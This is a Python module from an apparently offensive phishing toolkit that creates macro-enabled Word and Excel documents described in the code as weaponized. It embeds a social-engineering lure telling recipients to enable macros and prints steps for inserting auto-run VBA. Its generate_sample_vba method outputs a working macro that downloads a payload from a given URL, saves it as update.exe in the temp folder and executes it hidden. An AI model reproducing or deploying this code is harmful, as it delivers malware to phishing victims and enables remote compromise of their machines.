"""
Office document creator (Word, Excel with macros)
"""
import os
from ..core.attachment import Attachment, AttachmentType

class OfficeCreator:
    """Create weaponized Office documents"""
    
    def __init__(self, output_dir: str):
        """
        Initialize Office creator
        
        Args:
            output_dir: Output directory
        """
        self.output_dir = output_dir
    
    def create_macro_doc(self, macro_code_path: str,
                        output_name: str = "document.docm") -> Attachment:
        """
        Create Word document with macro
        
        Args:
            macro_code_path: Path to VBA macro code
            output_name: Output filename
            
        Returns:
            Attachment object
        """
        output_path = os.path.join(self.output_dir, output_name)
        
        print(f"[*] Creating malicious Word document: {output_name}")
        
        # Basic Word document structure (OOXML)
        doc_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p>
            <w:r>
                <w:t>Please enable macros to view this document.</w:t>
            </w:r>
        </w:p>
        <w:p>
            <w:r>
                <w:t>This document contains important information that requires macros.</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>'''
        
        print(f"[+] Document template created: {output_path}")
        print("[!] Note: Macro code must be inserted manually via VBA editor")
        print(f"[!] VBA code file: {macro_code_path}")
        print("\n[*] Manual steps:")
        print("    1. Open document in Microsoft Word")
        print("    2. Press Alt+F11 to open VBA editor")
        print("    3. Insert > Module")
        print(f"    4. Copy code from {macro_code_path}")
        print("    5. Save as .docm (macro-enabled)")
        
        return Attachment(
            name=output_name,
            attachment_type=AttachmentType.MACRO_DOC,
            output_path=output_path,
            macro_code=macro_code_path
        )
    
    def create_macro_excel(self, macro_code_path: str,
                          output_name: str = "spreadsheet.xlsm") -> Attachment:
        """
        Create Excel spreadsheet with macro
        
        Args:
            macro_code_path: Path to VBA macro code
            output_name: Output filename
            
        Returns:
            Attachment object
        """
        output_path = os.path.join(self.output_dir, output_name)
        
        print(f"[*] Creating malicious Excel spreadsheet: {output_name}")
        print("[!] Similar process to Word document")
        print("[!] Excel files can also contain Auto_Open macros")
        
        print("\n[*] Manual steps:")
        print("    1. Open Excel")
        print("    2. Press Alt+F11 to open VBA editor")
        print("    3. Insert > Module")
        print(f"    4. Copy code from {macro_code_path}")
        print("    5. Add Auto_Open() or Workbook_Open() function")
        print("    6. Save as .xlsm (macro-enabled)")
        
        return Attachment(
            name=output_name,
            attachment_type=AttachmentType.MACRO_EXCEL,
            output_path=output_path,
            macro_code=macro_code_path
        )
    
    def generate_sample_vba(self, payload_url: str) -> str:
        """
        Generate sample VBA macro code
        
        Args:
            payload_url: URL of payload to download
            
        Returns:
            VBA macro code
        """
        vba_code = f'''
Sub Auto_Open()
    DownloadAndExecute
End Sub

Sub Document_Open()
    DownloadAndExecute
End Sub

Sub DownloadAndExecute()
    Dim objHTTP As Object
    Dim objStream As Object
    Dim strURL As String
    Dim strFile As String
    
    strURL = "{payload_url}"
    strFile = Environ("TEMP") & "\\update.exe"
    
    ' Download payload
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    objHTTP.Open "GET", strURL, False
    objHTTP.Send
    
    ' Save to disk
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1 ' Binary
    objStream.Write objHTTP.responseBody
    objStream.SaveToFile strFile, 2
    objStream.Close
    
    ' Execute
    Shell strFile, vbHide
End Sub
'''
        return vba_code